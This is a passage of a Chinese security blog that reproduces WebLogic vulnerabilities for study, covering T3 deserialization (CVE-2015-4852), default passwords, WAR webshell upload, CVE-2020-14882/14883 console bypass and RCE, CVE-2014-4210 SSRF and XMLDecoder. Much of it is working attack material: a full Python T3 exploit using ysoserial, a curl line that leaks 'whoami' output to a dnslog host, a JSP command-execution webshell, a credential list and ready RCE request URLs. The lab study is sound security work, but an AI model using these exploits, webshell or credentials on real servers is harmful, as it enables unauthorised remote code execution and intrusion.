<p>筛选条件: <code>tcp.port==7001</code><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405184839.png" alt="image.png"><br>可以发现返回包里有weblogic的版本信息: 10.3.6.0<br>关于weblogic的请求体结构,我们参考z_zz_zzz师傅文章(原文链接: <a href="http://drops.xmd5.com/static/drops/web-13470.html)的图片">http://drops.xmd5.com/static/drops/web-13470.html)的图片</a>:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/image.png" alt="image.png"></p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/img.png" alt="img.png"></p>
<p>第一个非Java序列化数据是我们的请求头<code>t3 12.2.3 AS:255 HL:19 MS:10000000 PU:t3://us-l-breens:7001</code>,后面的2到7部分数据都是序列化数据,我们只要修改其中一个为恶意数据发给服务端就可以造成反序列化攻击<br>还有一种攻击方式是将第一部分数据和恶意数据进行拼接</p>
<h2 id="CVE-2015-4852"><a href="#CVE-2015-4852" class="headerlink" title="CVE-2015-4852"></a>CVE-2015-4852</h2><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>exp:<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload1</span>(<span class="params">gadget, command</span>):</span><br><span class="line">    JAR_FILE = <span class="string">&#x27;ysoserial.jar&#x27;</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, JAR_FILE, gadget, command], stdout=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">return</span> popen.stdout.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload2</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">host, port, payload</span>):</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((host, port))</span><br><span class="line"></span><br><span class="line">    handshake = <span class="string">&quot;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&quot;</span>.encode()</span><br><span class="line">    sock.sendall(handshake)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&quot;HELO:(.*).false&quot;</span>)</span><br><span class="line">    version = re.findall(pattern, data.decode())</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(version) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not Weblogic&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Weblogic &#123;&#125;&quot;</span>.<span class="built_in">format</span>(version[<span class="number">0</span>]))</span><br><span class="line">    data_len = binascii.a2b_hex(<span class="string">b&quot;00000000&quot;</span>) <span class="comment">#数据包长度，先占位，后面会根据实际情况重新</span></span><br><span class="line">    t3header = binascii.a2b_hex(<span class="string">b&quot;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&quot;</span>) <span class="comment">#t3协议头</span></span><br><span class="line">    flag = binascii.a2b_hex(<span class="string">b&quot;fe010000&quot;</span>) <span class="comment">#反序列化数据标志</span></span><br><span class="line">    payload = data_len + t3header + flag + payload</span><br><span class="line">    payload = struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, <span class="built_in">len</span>(payload)) + payload[<span class="number">4</span>:] <span class="comment">#重新计算数据包长度</span></span><br><span class="line">    sock.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    port = <span class="number">7001</span></span><br><span class="line">    gadget = <span class="string">&quot;CommonsCollections6&quot;</span> <span class="comment">#CommonsCollections1 Jdk7u21</span></span><br><span class="line">    command = <span class="string">&quot;calc&quot;</span></span><br><span class="line">    <span class="comment"># command = &quot;curl http://`whoami`.5dhwnx.dnslog.cn&quot;</span></span><br><span class="line"></span><br><span class="line">    payload = get_payload1(gadget, command)</span><br><span class="line">    <span class="comment">#payload=get_payload2(&#x27;./pay.tmp&#x27;)</span></span><br><span class="line">    exp(host, port, payload)</span><br></pre></td></tr></table></figure><br>这里选的CC6不受jdk版本限制<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405190655.png" alt="image.png"></p>
<p>注意:</p>
<ul>
<li>当前文件夹放ysoserial.jar</li>
<li>这里我加入了一句time.sleep(1)是因为python socket 如果是频繁发包，会被服务端所拒绝,第一次recv的内容只有HELO没有后面的内容,if语句过不了会直接return<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">T3Test</span>(<span class="params">ip,port</span>):</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((ip, port))</span><br><span class="line">    handshake = <span class="string">&quot;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&quot;</span> <span class="comment">#请求包的头</span></span><br><span class="line">    sock.sendall(handshake.encode())</span><br><span class="line">    <span class="comment"># time.sleep(1)</span></span><br><span class="line">    data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(data.decode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ip = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    port = <span class="number">7001</span></span><br><span class="line"></span><br><span class="line">    T3Test(ip,port)</span><br></pre></td></tr></table></figure>
如果注释掉sleep会只返回HELO,不注释就会返回<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HELO:10.3.6.0.false</span><br><span class="line">AS:2048</span><br><span class="line">HL:19</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>关键的数据拼接:<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data_len = binascii.a2b_hex(<span class="string">b&quot;00000000&quot;</span>) <span class="comment">#数据包长度，先占位，后面会根据实际情况重新</span></span><br><span class="line">t3header = binascii.a2b_hex(<span class="string">b&quot;016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006&quot;</span>) <span class="comment">#t3协议头</span></span><br><span class="line">flag = binascii.a2b_hex(<span class="string">b&quot;fe010000&quot;</span>) <span class="comment">#反序列化数据标志</span></span><br><span class="line">payload = data_len + t3header + flag + payload</span><br><span class="line">payload = struct.pack(<span class="string">&#x27;&gt;I&#x27;</span>, <span class="built_in">len</span>(payload)) + payload[<span class="number">4</span>:] <span class="comment">#重新计算数据包长度</span></span><br></pre></td></tr></table></figure><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405192212.png" alt="image.png"></p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>这里能调用成功是因为它自带了commons-collections的包<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405193643.png" alt="image.png"></p>
<p>我们在InboundMsgAbbrev的readObject()方法下断点<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405195449.png" alt="image.png"><br>先会调用ServerChannelInputStream的readObject()方法,而且ServerChannelInputStream是继承ObjectInputstream的<br>然后调用一系列的readObejct:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.readObject</span><br><span class="line">ObjectInputstream.readObject0</span><br><span class="line">ObjectInputstream.readOrdinary</span><br><span class="line">...</span><br><span class="line">InboundMsgAbbrev的resolveClass</span><br></pre></td></tr></table></figure><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405195811.png" alt="image.png"><br>这里<code>super.resolveClass</code>还是调用了<code>ObjectInputstream.resolveClass</code><br>此时的var2就是解析的java.util.hashSet<br>不断调用这个方法…<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405200308.png" alt="image.png"><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405200403.png" alt="image.png"><br>最后执行命令</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://developer.aliyun.com/article/616728">https://developer.aliyun.com/article/616728</a></li>
<li><a href="https://boogipop.com/2023/04/26/Weblogic%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0">https://boogipop.com/2023/04/26/Weblogic%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0</a></li>
<li><a href="https://drun1baby.top/2022/11/28/CVE-2015-4852-WebLogic-T3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/">https://drun1baby.top/2022/11/28/CVE-2015-4852-WebLogic-T3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Weblogic学习2-一些历史漏洞的复现</title>
    <url>/2024/04/06/Weblogic%E5%AD%A6%E4%B9%A02/</url>
    <content><![CDATA[<h2 id="Weblogic-弱口令-amp-amp-文件上传"><a href="#Weblogic-弱口令-amp-amp-文件上传" class="headerlink" title="Weblogic 弱口令&amp;&amp;文件上传"></a>Weblogic 弱口令&amp;&amp;文件上传</h2><p>/console路由:<br>常见弱口令:</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>账户</th>
<th>密码</th>
</tr>
</thead>
<tbody>
<tr>
<td>system</td>
<td>password</td>
</tr>
<tr>
<td>weblogic</td>
<td>weblogic</td>
</tr>
<tr>
<td>guest</td>
<td>guest</td>
</tr>
<tr>
<td>portaladmin</td>
<td>portaladmin</td>
</tr>
<tr>
<td>admin</td>
<td>security</td>
</tr>
<tr>
<td>joe</td>
<td>password</td>
</tr>
<tr>
<td>mary</td>
<td>password</td>
</tr>
<tr>
<td>system</td>
<td>security</td>
</tr>
<tr>
<td>wlcsystem</td>
<td>wlcsystem</td>
</tr>
<tr>
<td>wlcsystem</td>
<td>sipisystem</td>
</tr>
</tbody>
</table>
</div>
<p>其他常见密码<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">weblogic1  </span><br><span class="line">weblogic12  </span><br><span class="line">weblogic123  </span><br><span class="line">weblogic@123  </span><br><span class="line">webl0gic  </span><br><span class="line">weblogic#  </span><br><span class="line">weblogic@</span><br></pre></td></tr></table></figure></p>
<p>上传war包RCE:<br>随便写一句话木马<br><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%  Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><br>打包<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jar cvf test.war test.jsp</span><br></pre></td></tr></table></figure><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405230656.png" alt="image.png"><br>先锁定并编辑,部署,安装<br>上传文件<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405230738.png" alt="image.png"><br>一直下一步.完成,先左上角点激活更改<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405230823.png" alt="image.png"><br>再回到部署把test启动<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405230855.png" alt="image.png"><br>此时访问127.0.0.1:7001/test/test.jsp<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405231344.png" alt="image.png"><br>成功执行命令,也可以修改jsp文件来让命令执行结构回显到网页上</p>
<h2 id="Weblogic-未授权-amp-amp-后台RCE"><a href="#Weblogic-未授权-amp-amp-后台RCE" class="headerlink" title="Weblogic 未授权&amp;&amp;后台RCE"></a>Weblogic 未授权&amp;&amp;后台RCE</h2><h3 id="CVE-2020-14883"><a href="#CVE-2020-14883" class="headerlink" title="CVE-2020-14883"></a>CVE-2020-14883</h3><p>没有登录weblogic访问/console会302跳转登录页面/console/login/LoginForm.jsp<br>但是我们可以通过双重URL编码来绕过认证未授权访问console后台</p>
<p>受影响版本<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Oracle WebLogic Server 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/console/css/%252e%252e%252fconsole.portal</span><br></pre></td></tr></table></figure>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405232201.png" alt="image.png"><br>或者浏览器抓包改包<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405232229.png" alt="image.png"></p>
<h3 id="CVE-2020-14882"><a href="#CVE-2020-14882" class="headerlink" title="CVE-2020-14882"></a>CVE-2020-14882</h3><p>此时后台权限比较低,不能安装应用,需要CVE-2020-14882来允许后台任意用户通过 HTTP 协议执行任意命令。</p>
<h4 id="方式1"><a href="#方式1" class="headerlink" title="方式1"></a>方式1</h4><p>借助<code>com.tangosol.coherence.mvel2.sh.ShellSession</code>类, Weblogic 12.2.1 及以上版本才有这个类,低版本不能用<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ip:7001/console/console.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec(&#x27;calc&#x27;);&quot;)</span><br></pre></td></tr></table></figure></p>
<h4 id="方式2"><a href="#方式2" class="headerlink" title="方式2"></a>方式2</h4><p>借助<code>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code>类,对所有weblogic版本都可用</p>
<p>先准备一个xml文件<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>url:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http://127.0.0.1:4444/exp.xml&quot;)</span><br></pre></td></tr></table></figure></p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405233121.png" alt="image.png"><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405233146.png" alt="image.png"></p>
<h2 id="Weblogic-SSRF"><a href="#Weblogic-SSRF" class="headerlink" title="Weblogic SSRF"></a>Weblogic SSRF</h2><p>CVE-2014-4210<br>影响版本:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- Oracle WebLogic Server 10.0.2, 10.3.6</span><br></pre></td></tr></table></figure><br>SearchPublicRegistries.jsp接口存在SSRF漏洞<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405233924.png" alt="image.png"><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001</span><br></pre></td></tr></table></figure><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405234036.png" alt="image.png"></p>
<p>看到报错<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">An error has occurred  </span><br><span class="line">weblogic.uddi.client.structures.exception.XML_SoapException: The server at http://127.0.0.1:7001 returned a 404 error code (Not Found). Please ensure that your URL is correct, and the web service has deployed without error.</span><br></pre></td></tr></table></figure><br>访问7000端口<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405234338.png" alt="image.png"><br>此时回显不同可以探测内网信息</p>
<h2 id="Weblogic-XMLDecoder"><a href="#Weblogic-XMLDecoder" class="headerlink" title="Weblogic XMLDecoder"></a>Weblogic XMLDecoder</h2><h3 id="xml基础"><a href="#xml基础" class="headerlink" title="xml基础"></a>xml基础</h3><p>XMLDecoder和XMLEncoder是jdk自带的内置包<br>语法:<br>XMLEncoder:<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.beans.XMLEncoder;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">XMLEncoder</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XMLEncoder</span>(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;result.xml&quot;</span>)));</span><br><span class="line">        e.writeObject(<span class="keyword">new</span> <span class="title class_">JButton</span>(<span class="string">&quot;Hello, world&quot;</span>));</span><br><span class="line">        e.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>结果:<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.8.0_201&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;javax.swing.JButton&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">string</span>&gt;</span>Hello, world<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>XMLDecoder:<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.beans.XMLDecoder;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">decode</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">XMLDecoder</span> <span class="variable">d</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XMLDecoder</span>(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;result.xml&quot;</span>)));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> d.readObject();</span><br><span class="line">        System.out.println(result);</span><br><span class="line">        d.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>输出<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javax.swing.JButton[,0,0,0x0,invalid,alignmentX=0.0,alignmentY=0.5,border=javax.swing.plaf.BorderUIResource$CompoundBorderUIResource@41cf53f9,flags=296,maximumSize=,minimumSize=,preferredSize=,defaultIcon=,disabledIcon=,disabledSelectedIcon=,margin=javax.swing.plaf.InsetsUIResource[top=2,left=14,bottom=2,right=14],paintBorder=true,paintFocus=true,pressedIcon=,rolloverEnabled=true,rolloverIcon=,rolloverSelectedIcon=,selectedIcon=,text=Hello, world,defaultCapable=true]</span><br></pre></td></tr></table></figure></p>
<p>几个标签:</p>
<ul>
<li>string标签: <code>&lt;string&gt;Hello, world&lt;/string&gt;</code></li>
<li>object标签: 表示对象,class属性指定具体类,method指定具体方法<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;javax.swing.JButton&quot;</span> <span class="attr">method</span>=<span class="string">&quot;new&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>Hello,xml<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>void标签表示函数调用和赋值<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">JButton</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JButton</span>();</span><br><span class="line">b.setText(<span class="string">&quot;Hello, world&quot;</span>);</span><br></pre></td></tr></table></figure>
可以对应:<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;javax.swing.JButton&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;setText&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>Hello,xml<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>array标签: 表示数组,class表示具体类,内部void标签的index属性表示根据指定数组索引赋值<br>eg.<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>Calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3>WebLogic 存在 WLS-WebServices 的组件皆会受到影响<br>此组件路径:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat </span><br><span class="line">Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/wls-wsat.war </span><br><span class="line">Middleware/wlserver_10.3/server/lib/wls-wsat.war</span><br></pre></td></tr></table></figure>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3>WebLogic 的 WLS Security 组件对外提供 WebService 服务，其中使用 XMLDecoder 来解析 XML 格式数据，其存在反序列化漏洞，从而导致 RCE。<br>看一个RCE的解析<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.beans.XMLDecoder;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">porc</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;exp.xml&quot;</span>);</span><br><span class="line">        <span class="type">XMLDecoder</span> <span class="variable">xmlDecoder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XMLDecoder</span>(<span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(file));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> xmlDecoder.readObject();</span><br><span class="line">        xmlDecoder.close();</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
exp.xml<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.4.0&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>Calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405210811.png" alt="image.png"></p>
<p>Weblogic 本质上是 Web Service 服务，报文内容类型是 SOAP 型 WebService 报文,所以 <code>/wls-wsat/CoordinatorPortType</code> 接口可以接收 XML 数据的请求包<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240405211037.png" alt="image.png"></p>
